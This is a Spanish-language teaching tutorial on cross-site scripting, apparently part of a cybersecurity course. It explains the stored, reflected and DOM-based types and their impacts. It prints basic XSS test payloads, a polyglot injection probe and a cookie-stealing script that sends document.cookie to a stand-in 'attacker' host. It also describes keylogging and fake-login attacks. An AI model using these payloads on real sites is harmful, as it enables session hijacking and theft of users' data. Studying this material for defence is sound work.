- **Robo de información:** Un atacante puede robar información confidencial del usuario, como credenciales de inicio de sesión, información bancaria o datos personales.
- **Ataques de phishing**: Se puede utilizar XSS para engañar a los usuarios para que proporcionen información personal o confidencial, como contraseñas o números de tarjetas de crédito.
- **Manipulación del contenido:** También puede ser utilizado para manipular el contenido de un sitio web, por ejemplo, para mostrar mensajes falsos, redireccionar a los usuarios a sitios maliciosos o incluso para cambiar la apariencia del sitio web.
- **Robo de sesiones:** Es posible inyectar código malicioso que intercepte la sesión de un usuario, lo que le permite realizar acciones en nombre del usuario.
- **Difusión de malware:** También un atacante puede utilizar XSS para inyectar código malicioso que descarga y ejecuta malware en el equipo del usuario sin su conocimiento o consentimiento.
- El impacto exacto depende en gran medida de la aplicación.
- XSS es generalmente una amenaza para las aplicaciones web que tienen usuarios autenticados o que son sensibles a la seguridad.
- El código malicioso puede ser capaz de manipular el contenido del sitio, cambiando su apariencia y/o función para otro usuario.
- Esto incluye modificar el comportamiento de la aplicación web (como redirigir formularios, etc.).
- El código también puede ser capaz de realizar acciones dentro de la aplicación sin conocimiento del usuario.
- El código script también puede obtener y retransmitir los valores de las cookies si no han sido configuradas como HttpOnly.

### Hay 3 tipos principales de XSS

- **Almacenado** : la entrada del usuario se almacena en el sitio web. Suele ocurrir en perfiles de usuario, foros, chats, etc., donde el contenido del usuario se almacena de forma permanente (o temporal). Los atacantes pueden inyectar cargas útiles maliciosas y todos los usuarios que naveguen por la página infectada se verán afectados. Esta es una de las formas más peligrosas de XSS porque la explotación no requiere phishing y puede afectar a muchos usuarios. Los XSS en páginas en las que solo el usuario del atacante tiene derecho a navegar (por ejemplo, la página de configuración del usuario) se denominan self-XSS y se considera que tienen un impacto cercano a 0, ya que teóricamente no puede afectar a otros usuarios.
- **Reflejado** : la entrada del usuario se refleja pero no se almacena. Suele ocurrir en formularios de búsqueda, páginas de inicio de sesión y páginas que reflejan contenido para una sola respuesta. Cuando la entrada vulnerable reflejada está en el URI ( [http://www.target.com/search.php?keyword=INJECTION](http://www.target.com/search.php?keyword=INJECTION)), los atacantes pueden crear un URI malicioso y enviarlo a las víctimas con la esperanza de que lo exploren. Esta forma de XSS generalmente requiere phishing y los atacantes pueden limitar la longitud de la carga maliciosa.
- **Basado en DOM** : mientras que los ataques XSS almacenados y reflejados explotan vulnerabilidades en el código del lado del servidor, un XSS basado en DOM explota las del lado del cliente (por ejemplo, JavaScript utilizado para ayudar a representar dinámicamente una página). Los XSS basados ​​en DOM generalmente afectan las entradas del usuario que se reflejan temporalmente, al igual que los ataques XSS reflejados.

## Práctica:

Los evaluadores deben identificar los vectores de entrada (partes de la aplicación que aceptan contenido de los usuarios) que se almacenan o reflejan.

- Parámetros de URI para XSS reflejado y basado en DOM
- Otras entradas de usuarios en foros, chats, comentarios, publicaciones y otro contenido almacenado para XSS almacenado
- Encabezados HTTP como cookies (e incluso agentes de usuario en algunos casos)

Una de las cargas útiles más famosas es <script>alert('XSS');</script>abrir una ventana emergente que hace eco de "XSS". Sin embargo, explotar XSS es como jugar al "gato y al ratón". Las entradas se pueden filtrar y los filtros se pueden omitir. A continuación se muestran algunos ejemplos básicos de cargas útiles XSS.

> <script>alert('XSS');</script>
> 
> 
> <IMG SRC=JaVaScRiPt:alert('XSS')>
> 
> <IMG onmouseover="alert('XSS')">
> 
> <<SCRIPT>alert("XSS");//<</SCRIPT>

> El siguiente [sitio web](https://transformations.jobertabma.nl/) ( [proyecto GitHub](https://github.com/jobertabma/transformations) ) puede ayudar a identificar las transformaciones aplicadas a las entradas de los usuarios. Esto puede ayudar a eludir filtros y transformaciones para aprovechar los ataques XSS.

> La siguiente carga útil se utiliza para probar inyecciones de SQL , XSS (Cross-Site Scripting) y SSTI (Inyección de plantilla del lado del servidor) .
> 
> '"<svg/onload=prompt(5);>{{7*7}}


Herramientas como [XSStrike](https://github.com/s0md3v/XSStrike) (Python) y [XSSer](https://github.com/epsylon/xsser) (Python) también pueden ayudar a encontrar y explotar vectores de entrada vulnerables XSS al fusionarlos con cargas útiles únicas y luego buscar patrones únicos en las respuestas.

​El atacante no apunta directamente a su víctima. En cambio, explota una vulnerabilidad en un sitio web que visita la víctima, para que el sitio web le entregue el JavaScript malicioso. Para el navegador de la víctima, el JavaScript malicioso parece ser una parte legítima del sitio web y, por lo tanto, el sitio web ha actuado como cómplice involuntario del atacante.

# **Cómo se inyecta el JavaScript malicioso**

La única forma que tiene el atacante de ejecutar su JavaScript malicioso en el navegador de la víctima es inyectarlo en una de las páginas que la víctima descarga del sitio web. Esto puede suceder si el sitio web incluye directamente la entrada del usuario en sus páginas, porque el atacante puede insertar una cadena que el navegador de la víctima tratará como código.

En el siguiente ejemplo, se utiliza un script simple del lado del servidor para mostrar el último comentario en un sitio web:

> print "<html>"
> 
> 
> print "Latest comment:"
> 
> print database.latestComment
> 
> print "</html>"

El script supone que un comentario consta únicamente de texto. Sin embargo, dado que la entrada del usuario se incluye directamente, un atacante podría enviar este comentario: " <script>...</script>". Cualquier usuario que visite la página recibirá ahora la siguiente respuesta:

> <html>
> 
> 
> Latest comment:
> 
> **<script>...</script>**
> 
> </html>
> 

Cuando el navegador del usuario carga la página, ejecutará cualquier código JavaScript contenido dentro de las <script>etiquetas. El atacante ahora ha tenido éxito con su ataque.

## **¿Qué es JavaScript malicioso?**

Al principio, la capacidad de ejecutar JavaScript en el navegador de la víctima puede no parecer particularmente maliciosa. Después de todo, JavaScript se ejecuta en un entorno muy restringido que tiene un acceso extremadamente limitado a los archivos y al sistema operativo del usuario. De hecho, podría abrir la consola JavaScript de su navegador ahora mismo y ejecutar cualquier JavaScript que desee, y sería muy poco probable que cause algún daño a su computadora.

Sin embargo, la posibilidad de que JavaScript sea malicioso se vuelve más clara cuando se consideran los siguientes hechos:

- JavaScript tiene acceso a parte de la información confidencial del usuario, como las cookies.
- JavaScript puede enviar solicitudes HTTP con contenido arbitrario a destinos arbitrarios mediante el uso XMLHttpRequestde otros mecanismos.
- JavaScript puede realizar modificaciones arbitrarias al HTML de la página actual utilizando métodos de manipulación DOM.

Estos hechos combinados pueden provocar fallos de seguridad muy graves, como explicaremos a continuación.

### **Las consecuencias del JavaScript malicioso**

Entre muchas otras cosas, la capacidad de ejecutar JavaScript arbitrario en el navegador de otro usuario permite a un atacante realizar los siguientes tipos de ataques:

### **Robo de cookies**

El atacante puede acceder a las cookies de la víctima asociadas con el sitio web mediante document.cookie, enviarlas a su propio servidor y utilizarlas para extraer información confidencial como ID de sesión.

### **Registro de teclas**

El atacante puede registrar un detector de eventos de teclado addEventListenery luego enviar todas las pulsaciones de teclas del usuario a su propio servidor, registrando potencialmente información confidencial como contraseñas y números de tarjetas de crédito.

### **Suplantación de identidad**

El atacante puede insertar un formulario de inicio de sesión falso en la página mediante manipulación DOM, configurar el actionatributo del formulario para que apunte a su propio servidor y luego engañar al usuario para que envíe información confidencial.

<aside>
👉 Aunque estos ataques difieren significativamente, todos tienen una similitud crucial: debido a que el atacante ha inyectado código en una página proporcionada por el sitio web, el JavaScript malicioso se ejecuta en el contexto de ese sitio web. Esto significa que se trata como cualquier otro script de ese sitio web: tiene acceso a los datos de la víctima para ese sitio web (como las cookies) y el nombre de host que se muestra en la barra de URL será el del sitio web. Para todos los efectos, el script se considera una parte legítima del sitio web, lo que le permite hacer cualquier cosa que el sitio web real pueda hacer.
</aside>

**Este hecho pone de relieve una cuestión clave:**

*Si un atacante puede utilizar su sitio web para ejecutar JavaScript arbitrario en el navegador de otro usuario, la seguridad de su sitio web y de sus usuarios se ha visto comprometida.* Para enfatizar este punto, algunos ejemplos de este tutorial omitirán los detalles de un script malicioso al mostrar solo <script>...</script>. Esto indica que la mera presencia de un script inyectado por el atacante es el problema, independientemente del código específico que realmente ejecute el script.

# **Actores en un ataque XSS**

Antes de describir en detalle cómo funciona un ataque XSS, debemos definir los actores involucrados en un ataque XSS. En general nvolucra a tres actores: **el sitio web** , **la víctima** y **el atacante** .

- **El sitio web** ofrece páginas HTML a los usuarios que las solicitan. En nuestros ejemplos, está ubicado en [http://website/](http://website/).
- **La base de datos del sitio web** es una base de datos que almacena algunas de las entradas del usuario incluidas en las páginas del sitio web.
- **La víctima** es un usuario normal del sitio web que solicita páginas del mismo a través de su navegador.
- **El atacante** es un usuario malintencionado del sitio web que pretende lanzar un ataque contra la víctima explotando una vulnerabilidad XSS en el sitio web.
- **El servidor del atacante** es un servidor web controlado por el atacante con el único propósito de robar información confidencial de la víctima. En nuestros ejemplos, está ubicado en [http://attacker/](http://attacker/).

**Un ejemplo de escenario de ataque**

En este ejemplo, asumiremos que el objetivo final del atacante es robar las cookies de la víctima explotando una vulnerabilidad XSS en el sitio web. Esto se puede hacer haciendo que el navegador de la víctima analice el siguiente código HTML:

> <script>
> 
> 
> window.location='http://attacker/?cookie='+document.cookie
> 
> </script>

Este script navega por el navegador del usuario a una URL diferente, lo que activa una solicitud HTTP al servidor del atacante. La URL incluye las cookies de la víctima como parámetro de consulta, que el atacante puede extraer de la solicitud cuando llega a su servidor. Una vez que el atacante ha adquirido las cookies, puede utilizarlas para hacerse pasar por la víctima y lanzar más ataques.

De ahora en adelante, el código HTML anterior se denominará **cadena maliciosa** o **script malicioso.** Es importante tener en cuenta que la cadena en sí sólo es maliciosa si finalmente se analiza como HTML en el navegador de la víctima, lo que sólo puede ocurrir como resultado de una vulnerabilidad XSS en el sitio web.

## **Cómo funciona el ataque**

El siguiente diagrama ilustra cómo un atacante puede realizar este ataque de ejemplo:

![XSS2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss2.png?raw=true)

1. El atacante utiliza uno de los formularios del sitio web para insertar una cadena maliciosa en la base de datos del sitio web.
2. La víctima solicita una página del sitio web.
3. El sitio web incluye la cadena maliciosa de la base de datos en la respuesta y la envía a la víctima.
4. El navegador de la víctima ejecuta el script malicioso dentro de la respuesta y envía las cookies de la víctima al servidor del atacante.

## **Tipos de XSS**

Si bien el objetivo de un ataque XSS es siempre ejecutar JavaScript malicioso en el navegador de la víctima, existen pocas formas fundamentalmente diferentes de lograr ese objetivo. Los ataques XSS suelen dividirse en tres tipos:

- **XSS persistente** , donde la cadena maliciosa se origina en la base de datos del sitio web.
- **XSS reflejado** , donde la cadena maliciosa se origina a partir de la solicitud de la víctima.
- **XSS basado en DOM** , donde la vulnerabilidad está en el código del lado del cliente en lugar del código del lado del servidor.

<aside>
💡 El ejemplo anterior ilustró un ataque XSS persistente. Ahora describiremos los otros dos tipos de ataques XSS: XSS reflejado y XSS basado en DOM.
</aside>

### **XSS reflejado**

En un ataque XSS reflejado, la cadena maliciosa es parte de la solicitud de la víctima al sitio web. Luego, el sitio web incluye esta cadena maliciosa en la respuesta enviada al usuario. El siguiente diagrama ilustra este escenario:

![XSS3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss3.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la envía a la víctima.
2. El atacante engaña a la víctima para que solicite la URL del sitio web.
3. El sitio web incluye la cadena maliciosa de la URL en la respuesta.
4. El navegador de la víctima ejecuta el script malicioso dentro de la respuesta y envía las cookies de la víctima al servidor del atacante.

**¿Cómo puede tener éxito el XSS reflejado?**

Al principio, el XSS reflejado puede parecer inofensivo porque requiere que la propia víctima envíe una solicitud que contenga una cadena maliciosa. Dado que nadie se atacaría voluntariamente, no parece haber forma de realizar el ataque.

Resulta que hay al menos dos formas comunes de hacer que una víctima lance un ataque XSS reflejado contra sí misma:

- Si el usuario se dirige a un individuo específico, el atacante puede enviar la URL maliciosa a la víctima (mediante correo electrónico o mensajería instantánea, por ejemplo) y engañarla para que la visite.
- Si el usuario se dirige a un grupo grande de personas, el atacante puede publicar un enlace a la URL maliciosa (en su propio sitio web o en una red social, por ejemplo) y esperar a que los visitantes hagan clic en él.

Estos dos métodos son similares y ambos pueden tener más éxito con el uso de un servicio de acortamiento de URL, que enmascara la cadena maliciosa de los usuarios que de otro modo podrían identificarla.

Lo que hemos discutido anteriormente es una vulnerabilidad XSS reflejada. Un ataque XSS reflejado suele ser un enlace que contiene código malicioso. Cuando alguien hace clic en ese enlace, se le dirige a un sitio web vulnerable y ese código malicioso se "refleja" en su navegador para realizar alguna acción maliciosa.

Los ataques XSS reflejados son mucho menos peligrosos que las vulnerabilidades XSS almacenadas (ver más abajo) por varias razones:

Los ataques XSS reflejados dependen de que la víctima realice algún tipo de acción mediante la cual visita el sitio web de destino y hace que genere contenido que realiza una acción maliciosa en su navegador. Esto hace que los ataques XSS reflejados sean muy difíciles o, a veces, imposibles de automatizar. Cada víctima debe ser atacada individualmente con un correo electrónico o algún otro contenido que contenga un enlace malicioso en el que deben hacer clic para ser el objetivo del ataque.

### **XSS basado en DOM**

XSS basado en DOM es una variante de XSS tanto persistente como reflejado. En un ataque XSS basado en DOM, el navegador de la víctima no analiza la cadena maliciosa hasta que se ejecuta el JavaScript legítimo del sitio web. El siguiente diagrama ilustra este escenario para un ataque XSS reflejado:

![XSS4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss4.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la envía a la víctima.
2. El atacante engaña a la víctima para que solicite la URL del sitio web.
3. El sitio web recibe la solicitud, pero no incluye la cadena maliciosa en la respuesta.
4. El navegador de la víctima ejecuta el script legítimo dentro de la respuesta, lo que provoca que el script malicioso se inserte en la página.
5. El navegador de la víctima ejecuta el script malicioso insertado en la página y envía las cookies de la víctima al servidor del atacante.

**¿Qué hace que XSS basado en DOM sea diferente?**

En los ejemplos anteriores de ataques XSS persistentes y reflejados, el servidor inserta el script malicioso en la página, que luego se envía como respuesta a la víctima. Cuando el navegador de la víctima recibe la respuesta, asume que el script malicioso es parte del contenido legítimo de la página y lo ejecuta automáticamente durante la carga de la página como con cualquier otro script.

Sin embargo, en el ejemplo de un ataque XSS basado en DOM, no se inserta ningún script malicioso como parte de la página; el único script que se ejecuta automáticamente durante la carga de la página es una parte legítima de la página. El problema es que este script legítimo utiliza directamente la entrada del usuario para agregar HTML a la página. Debido a que la cadena maliciosa se inserta en la página usando innerHTML, se analiza como HTML, lo que provoca que se ejecute el script malicioso.

**La diferencia es sutil pero importante:**

- En XSS tradicional, el JavaScript malicioso se ejecuta cuando se carga la página, como parte del HTML enviado por el servidor.
- En XSS basado en DOM, el JavaScript malicioso se ejecuta en algún momento después de que la página se haya cargado, como resultado de que el JavaScript legítimo de la página trata la entrada del usuario de forma insegura.

**Por qué es importante el XSS basado en DOM**

En el ejemplo anterior, JavaScript no era necesario; el servidor podría haber generado todo el HTML por sí solo. Si el código del lado del servidor estuviera libre de vulnerabilidades, el sitio web estaría a salvo de XSS.

Sin embargo, a medida que las aplicaciones web se vuelven más avanzadas, JavaScript genera una cantidad cada vez mayor de HTML en el lado del cliente en lugar de hacerlo en el servidor. Cada vez que sea necesario cambiar el contenido sin actualizar toda la página, la actualización debe realizarse mediante JavaScript. En particular, este es el caso cuando una página se actualiza después de una solicitud AJAX.

Esto significa que las vulnerabilidades XSS pueden estar presentes no sólo en el código del lado del servidor de su sitio web, sino también en el código JavaScript del lado del cliente de su sitio web. En consecuencia, incluso con un código del lado del servidor completamente seguro, el código del lado del cliente aún podría incluir de manera insegura la entrada del usuario en una actualización del DOM después de que se haya cargado la página. Si esto sucede, el código del lado del cliente ha habilitado un ataque XSS sin que sea culpa del código del lado del servidor.

### **XSS basado en DOM invisible para el servidor**

Existe un caso especial de XSS basado en DOM en el que, para empezar, la cadena maliciosa nunca se envía al servidor del sitio web: cuando la cadena maliciosa está contenida en el identificador de fragmento de una URL (cualquier cosa después del carácter #). Los navegadores no envían esta parte de la URL a los servidores, por lo que el sitio web no tiene forma de acceder a ella mediante el código del lado del servidor. El código del lado del cliente, sin embargo, tiene acceso a él y, por lo tanto, puede causar vulnerabilidades XSS si lo maneja de manera insegura.

Esta situación no se limita a los identificadores de fragmentos. Otras entradas del usuario que son invisibles para el servidor incluyen nuevas funciones HTML5 como LocalStorage e IndexedDB.

Vulnerabilidades XSS almacenadas (o persistentes)

Un ataque XSS almacenado es mucho más peligroso por dos razones.

> En primer lugar, se puede automatizar un ataque XSS almacenado. Se puede crear un script que visite miles de sitios web, explote una vulnerabilidad en cada sitio y suelte una carga útil XSS almacenada.

> **En segundo lugar, las víctimas de un ataque XSS almacenado no tienen que realizar ninguna otra acción que no sea visitar el sitio web afectado.** Cualquiera que visite la página afectada del sitio se convertirá en víctima porque el código malicioso almacenado se cargará en su navegador. Las víctimas no necesitan realizar ninguna acción adicional, como hacer clic en un enlace enviado por correo electrónico, para verse afectadas.


Un ataque XSS almacenado ocurre cuando un atacante envía datos maliciosos a un sitio web que está almacenado en una base de datos o algún otro mecanismo de almacenamiento. Luego, cuando otros visitantes del sitio visitan una página o una URL específica, reciben esos datos que ejecutan y realizan algún tipo de acción maliciosa. Veamos un ejemplo:

![XSS5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss5.png?raw=true)

El código anterior es una aplicación de libro de visitas muy básica. También es un ejemplo clásico de vulnerabilidad XSS almacenada. Cuando cargue esta aplicación, verá un formulario que le pedirá que firme un libro de visitas que se ve así: